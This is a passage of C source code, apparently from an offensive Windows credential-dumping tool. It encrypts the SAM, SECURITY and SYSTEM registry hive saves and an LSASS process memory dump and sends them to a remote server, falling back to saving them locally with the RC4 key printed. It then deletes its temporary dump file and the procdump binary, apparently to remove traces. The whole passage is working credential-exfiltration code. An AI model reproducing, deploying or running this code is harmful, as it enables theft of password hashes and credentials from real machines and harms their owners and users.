			encRc4DataWithType[0] = 0;
		}
		else if (pDumpData != NULL) {
			encRc4DataWithType[0] = 1;
		}
		else if (pSamData != NULL && pSecurityData != NULL && pSystemData != NULL) {
			encRc4DataWithType[0] = 2;
		}

		memcpy(encRc4DataWithType + 1, encRc4Key, 64);

#ifdef DEBUG
		printf("[i] Connecting to %s:%d\n", serverIp, serverPort);
		printf("[i] Sending Encrypted Key...\n");
#endif // DEBUG

		for (retryCount = 0; retryCount < 3; retryCount++) {
			if (SendFile(serverIp, serverPort, encRc4DataWithType, sizeof(encRc4DataWithType))) {
				break;
			}
			printf("[i] Retrying...\n");
			Sleep(1000);
		}

		if (retryCount == 3) {
			printf("[!] Failed to Transfer Key, Saving Locally Instead.\n");
			goto SaveToLocal;
		}

//==========================================================================================
// Transferring SAM
		if (pSamData != NULL && pSecurityData != NULL && pSystemData != NULL) {
#ifdef DEBUG
			printf("[i] Sending Encrypted SAM Save...\n");
			Sleep(standardDelay);
#endif // DEBUG

			for (retryCount = 0; retryCount < 3; retryCount++) {
				if (SendFile(serverIp, serverPort, pSamData, dwSamSize)) {
					break;
				}
				printf("[i] Retrying...\n");
				Sleep(1000);
			}

			if (retryCount == 3) {
#ifdef DEBUG
				printf("[!] Failed to Transfer SAM Save, Saving Locally Instead.\n");
#endif // DEBUG
				goto SaveToLocal;
			}

//==========================================================================================
// Transferring SECURITY
#ifdef DEBUG
			printf("[i] Sending Encrypted SECURITY Save...\n");
			Sleep(standardDelay);
#endif // DEBUG

			for (retryCount = 0; retryCount < 3; retryCount++) {
				if (SendFile(serverIp, serverPort, pSecurityData, dwSecuritySize)) {
					break;
				}
				printf("[i] Retrying...\n");
				Sleep(1000);
			}

			if (retryCount == 3) {
#ifdef DEBUG
				printf("[!] Failed to Transfer SECURITY Save, Saving Locally Instead.\n");
#endif // DEBUG
				goto SaveToLocal;
			}

//==========================================================================================
// Transferring SYSTEM
#ifdef DEBUG
			printf("[i] Sending Encrypted SYSTEM Save...\n");
			Sleep(standardDelay);
#endif // DEBUG

			for (retryCount = 0; retryCount < 3; retryCount++) {
				if (SendFile(serverIp, serverPort, pSystemData, dwSystemSize)) {
					break;
				}
				printf("[i] Retrying...\n");
				Sleep(1000);
			}

			if (retryCount == 3) {
#ifdef DEBUG
				printf("[!] Failed to Transfer SYSTEM Save, Saving Locally Instead.\n");
#endif // DEBUG
				goto SaveToLocal;
			}
		}

//==========================================================================================
// Transferring LSASS dump
// Putting this last since it will take the longest
		if (pDumpData != NULL) {
			if (pSamData != NULL && pSecurityData != NULL && pSystemData != NULL) {
#ifdef DEBUG
				// Setting long delay for non interactive shells
				// could use WaitForObject to check if previous transfers are complete but this will do for now
				printf("[i] Waiting %d Seconds For Previous Data Transfer to Complete...\n", longDelay / 1000);
				printf("[i] Press Enter to Skip\n");
#endif // DEBUG
				int waited = 0;
				while (!_kbhit() && waited < longDelay) {
					Sleep(500);
					waited += 500;
				}
				if (_kbhit()) {
					_getch();
				}
			}
			else {
				Sleep(standardDelay);
			}
#ifdef DEBUG
			printf("[i] Sending Encrypted LSASS Dump...\n");
			fflush(stdout);
#endif // DEBUG
			for (retryCount = 0; retryCount < 3; retryCount++) {
				if (SendFile(serverIp, serverPort, pDumpData, dwDumpSize)) {
					break;
				}
				printf("[i] Retrying...\n");
				Sleep(1000);
			}

			if (retryCount == 3) {
				printf("[!] Failed to Transfer LSASS Dump, Saving Locally Instead.\n");
				goto SaveToLocal;
			}
		}
	}


//==========================================================================================================================================================
// cleanup functions

	if (pDumpData != NULL) {
		HeapFree(GetProcessHeap(), 0, pDumpData);
	}
	if (pSamData != NULL) {
		HeapFree(GetProcessHeap(), 0, pSamData);
	}
	if (pSecurityData != NULL) {
		HeapFree(GetProcessHeap(), 0, pSecurityData);
	}
	if (pSystemData != NULL) {
		HeapFree(GetProcessHeap(), 0, pSystemData);
	}
	free(args.procDumpPath);
	free(args.localDmpPath);
	free(args.tempDmpPath);

	printf("[+] All done!\n\n");

	return 0;

SaveToLocal:
	if (pDumpData != NULL) {
		WriteToFile(pDumpData, dwDumpSize, args.localDmpPath, TRUE);
	}
	if (pSamData != NULL && pSecurityData != NULL && pSystemData != NULL) {
		CHAR	currentDir[MAX_PATH],
			samSavePath[MAX_PATH],
			securitySavePath[MAX_PATH],
			systemSavePath[MAX_PATH];

		if (_getcwd(currentDir, MAX_PATH) == NULL) {
#ifdef DEBUG
			printf("[!] Unable to Get Current Directory!\n");
#endif // DEBUG
		}
		else {
			sprintf(samSavePath, "%s\\sam.dat", currentDir);
			sprintf(securitySavePath, "%s\\security.dat", currentDir);
			sprintf(systemSavePath, "%s\\system.dat", currentDir);

			WriteToFile(pSamData, dwSamSize, samSavePath, TRUE);
			WriteToFile(pSecurityData, dwSecuritySize, securitySavePath, TRUE);
			WriteToFile(pSystemData, dwSystemSize, systemSavePath, TRUE);
		}
	}
	PrintKey(rc4Key, RC4KEYSIZE);

ErrorCleanUp:
	FileExistsAndDelete(args.tempDmpPath, TRUE);

	if (args.procDumpMode) {
		for (retryCount = 0; retryCount < 20; retryCount++) {
			if (FileExistsAndDelete(args.procDumpPath, TRUE)) {
				break;
			}
			else {
				Sleep(100);
			}
		}

		if (retryCount == 20) {
#ifdef DEBUG
			printf("[!] Failed to Delete %s\n", args.procDumpPath);
#endif // DEBUG
		}
	}

	if (pDumpData != NULL) {
		HeapFree(GetProcessHeap(), 0, pDumpData);
	}
	if (pSamData != NULL) {
		HeapFree(GetProcessHeap(), 0, pSamData);
	}
	if (pSecurityData != NULL) {
		HeapFree(GetProcessHeap(), 0, pSecurityData);
	}
	if (pSystemData != NULL) {
		HeapFree(GetProcessHeap(), 0, pSystemData);
	}
	free(args.procDumpPath);
	free(args.localDmpPath);
	free(args.tempDmpPath);

	exit(EXIT_FAILURE);
}
